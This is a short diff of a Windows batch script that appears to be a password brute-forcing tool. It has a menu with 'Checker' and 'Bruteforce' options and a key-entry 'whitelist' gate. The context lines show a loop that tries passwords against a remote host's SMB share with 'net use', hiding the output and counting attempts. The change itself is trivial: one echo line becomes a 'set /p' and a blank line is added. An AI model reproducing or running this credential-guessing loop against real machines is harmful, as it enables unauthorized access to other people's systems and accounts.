@@ -26,7 +26,7 @@ echo #
 set /p [16:00] - Insert key : "
 echo [16:00] - Whitelisted.
 echo [1] Checker
-echo [2] Bruteforce
+set /p [2] Bruteforce
 
 echo #
 set /p Choose an option: "
@@ -53,6 +53,7 @@ exit
 net use \\%ip% /user:%user% %pass% >nul 2>&1
 echo [ATTEMPT %count%] [%pass%]
 set /a count=%count%+1
+
 
 
 
